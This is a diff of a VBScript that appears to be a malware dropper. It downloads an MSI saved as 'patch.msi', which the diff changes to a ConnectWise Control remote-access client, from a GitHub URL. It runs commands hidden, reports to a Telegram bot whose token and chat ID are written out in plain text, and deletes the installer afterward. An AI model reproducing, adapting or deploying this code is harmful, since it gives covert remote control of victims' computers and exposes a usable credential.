@@ -2,7 +2,7 @@
 Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH
 BOT_TOKEN = "8455971530:AAFxlChPnq5UAb1EUfPF-siNNoTBPFaKMno"
 CHAT_ID = "8345342738"
-PACKAGE_URL = "https://github.com/kemo828/kr/raw/refs/heads/main/ClientSetup.msi"
+PACKAGE_URL = "https://github.com/kemo828/test/raw/refs/heads/main/ConnectWiseControl.ClientSetup%20(6).msi"
 TEMP_PATH = "C:\Temp\patch.msi"
 
 Set objShell = CreateObject("WScript.Shell")
@@ -42,3 +42,4 @@ objShell.Run notifyCmd, 0, True
 If objFSO.FileExists(TEMP_PATH) Then
     objFSO.DeleteFile(TEMP_PATH)
 End If
+
